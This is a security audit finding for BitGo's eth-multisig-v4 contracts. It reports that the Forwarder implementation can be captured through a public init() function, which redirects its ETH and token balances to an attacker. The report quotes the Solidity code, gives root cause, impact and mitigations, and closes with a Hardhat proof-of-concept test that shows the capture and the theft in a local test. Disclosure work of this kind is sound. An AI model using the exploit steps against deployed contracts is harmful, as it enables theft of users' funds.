# Forwarder Implementation Capture via Public Init
**#H-09**
- Severity: High
- Validity: Unreviewed

## Affected Scope

This finding is scoped to `Forwarder.sol`, specifically:

- `init(address _parentAddress, bool _autoFlush721, bool _autoFlush1155)`
- the standalone implementation contract deployed by `scripts/deploy.ts`

It is not a duplicate of the `WalletSimple` implementation-capture finding (`#H-08`). The issue here is the forwarder implementation's own parent-address slot: once captured, the implementation auto-flushes any ETH or ERC20 balance that subsequently reaches its address directly to the attacker, with no signer involvement.

## Description

`Forwarder` is the implementation contract that `ForwarderFactory` clones via EIP-1167. The deployment script publishes the implementation as a standalone live contract and the factory then produces clones on demand. The implementation is never self-initialized by the deployment pipeline.

Because the implementation's `init` is `external onlyUninitialized`, the first external caller to reach the implementation directly can assign `parentAddress` to an attacker-controlled address:

```solidity
function init(
  address _parentAddress,
  bool _autoFlush721,
  bool _autoFlush1155
) external onlyUninitialized {
  parentAddress = _parentAddress;
  ...
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/Forwarder.sol#L26-L50

The guard used:

```solidity
modifier onlyUninitialized() {
  require(parentAddress == address(0x0), 'Already initialized');
  _;
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/Forwarder.sol#L63-L66

After capture, the forwarder's `receive()` / `fallback()` auto-forward every incoming ETH directly to the attacker's address:

```solidity
fallback() external payable {
  flush();
}

receive() external payable {
  flush();
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/Forwarder.sol#L71-L80

```solidity
function flush() public {
  uint256 value = address(this).balance;
  if (value == 0) { return; }
  emit ForwarderDeposited(msg.sender, value, msg.data);
  (bool success, ) = parentAddress.call{ value: value }('');
  require(success, 'Flush failed');
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/Forwarder.sol#L299-L309

The attacker also gains the `onlyParent` role on ERC20/ERC721/ERC1155 flush paths (`flushTokens`, `flushERC721Token`, `flushERC1155Tokens`, `batchFlushERC1155Tokens`, `callFromParent`).

The factory only initializes the clone, not the implementation:

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderFactory.sol#L20-L46

The deploy script:

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/scripts/deploy.ts#L162-L245

The dangerous step is not the existence of a public `init` by itself, and it is not the auto-flush design by itself. The issue only appears when both are composed: an attacker captures the implementation's parent slot, and then any ETH or token routed to that address is forcibly forwarded to the attacker with no further interaction.

## Root Cause

The root cause is that `init` is `external` and the deployment pipeline does not self-initialize the implementation. The implementation's `parentAddress` is the only access-control input for `flushTokens`/`flushERC721Token`/`flushERC1155Tokens`/`callFromParent`, so controlling `init` is equivalent to controlling all value-exit paths on the implementation's own balance.

The critical composition is:

```solidity
function init(
  address _parentAddress,
  ...
) external onlyUninitialized {
  parentAddress = _parentAddress;
  ...
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/Forwarder.sol#L26-L50

combined with:

```solidity
(bool success, ) = parentAddress.call{ value: value }('');
require(success, 'Flush failed');
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/Forwarder.sol#L307-L308

and the deploy script never initializing the implementation:

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/scripts/deploy.ts#L162-L245

## Impact

Any ETH, ERC20, ERC721, or ERC1155 that ever reaches the captured `Forwarder` implementation address flows to the attacker automatically. ETH flushes on every deposit without a separate flush transaction; tokens flush on the attacker's first `flushTokens` / `flushERC721Token` call as the captured parent.

TVL-at-risk growth model: over the implementation's lifetime `T`, the attacker extracts the integral of all value routed to the implementation address during that period. Operational realities that increase this integral:

- users or off-chain tooling confusing implementation and clone addresses,
- approvals for `setApprovalForAll` granted to the implementation rather than a clone,
- test flows or bridge receipts that land at the template address.

All of the above compound into a long-tail drain that grows as `T` grows. This meets the High tier under Program Details as an unauthorized transfer / locked-funds class on the implementation's own state.

## Recommended Mitigation

- Initialize `parentAddress` to a burn address or a deploy-time governance address inside the constructor so `init` cannot be claimed post-deploy.
- Alternatively, have the deploy script call `init` on the implementation immediately after deployment and before it publishes the address.
- Add a regression test asserting `init` on the deployed implementation must revert.
- Document that the published implementation address must never receive value or approvals.

### Test Code Path

### c4-forwarder-impl-capture.poc.js (D:\eth-multisig-v4\test\poc\c4-forwarder-impl-capture.poc.js)

```js
const { expect } = require('chai');
const { ethers } = require('hardhat');

// C4: Forwarder implementation is deployed standalone and never initialized.
// An attacker calls init(attackerParent, ...) on the implementation to set
// themselves as parentAddress. Any ETH sent to the implementation address
// (via operational mistake or force-deposit followed by a touch transaction)
// is forwarded to the attacker via flush() / receive() / fallback().
//
// Root cause:
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\Forwarder.sol:26-50
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\Forwarder.sol:71-80
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\Forwarder.sol:299-309
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\scripts\deploy.ts (no init on impl)

describe('PoC C4: Forwarder implementation capture via public init()', function () {
  let Forwarder, FixedSupplyToken;
  let attacker, victim, tokenOwner;

  before(async () => {
    [attacker, victim, tokenOwner] = await ethers.getSigners();
    Forwarder = await ethers.getContractFactory('Forwarder');
    FixedSupplyToken = await ethers.getContractFactory('FixedSupplyToken');
  });

  it('captures ETH mis-sent to the implementation and routes it to the attacker parent', async () => {
    const implementation = await Forwarder.deploy();
    await implementation.waitForDeployment();
    const implementationAddress = await implementation.getAddress();

    // Attacker captures parentAddress on the live implementation.
    await implementation.connect(attacker).init(attacker.address, false, false);
    expect(await implementation.parentAddress()).to.equal(attacker.address);

    // Victim mis-routes ETH to the implementation address.
    // receive() auto-flushes to the new parent (attacker).
    await expect(
      victim.sendTransaction({
        to: implementationAddress,
        value: ethers.parseEther('2')
      })
    ).to.changeEtherBalance(attacker, ethers.parseEther('2'));

    // Implementation holds zero after auto-flush.
    expect(await ethers.provider.getBalance(implementationAddress)).to.equal(0n);
  });

  it('captures ERC20 tokens accidentally routed to the implementation via flushTokens', async () => {
    const implementation = await Forwarder.deploy();
    await implementation.waitForDeployment();
    const implementationAddress = await implementation.getAddress();

    await implementation.connect(attacker).init(attacker.address, false, false);

    const token = await FixedSupplyToken.connect(tokenOwner).deploy();
    await token.waitForDeployment();
    await token.connect(tokenOwner).transfer(implementationAddress, 1_000n);
    expect(await token.balanceOf(implementationAddress)).to.equal(1_000n);

    // Only parent (now attacker) can call flushTokens. Attacker pulls the tokens.
    await implementation.connect(attacker).flushTokens(await token.getAddress());

    expect(await token.balanceOf(implementationAddress)).to.equal(0n);
    expect(await token.balanceOf(attacker.address)).to.equal(1_000n);
  });

  it('init cannot be called twice (attacker locks ownership after capture)', async () => {
    const implementation = await Forwarder.deploy();
    await implementation.waitForDeployment();

    await implementation.connect(attacker).init(attacker.address, false, false);
    await expect(
      implementation.connect(victim).init(victim.address, false, false)
    ).to.be.revertedWith('Already initialized');
  });
});
```
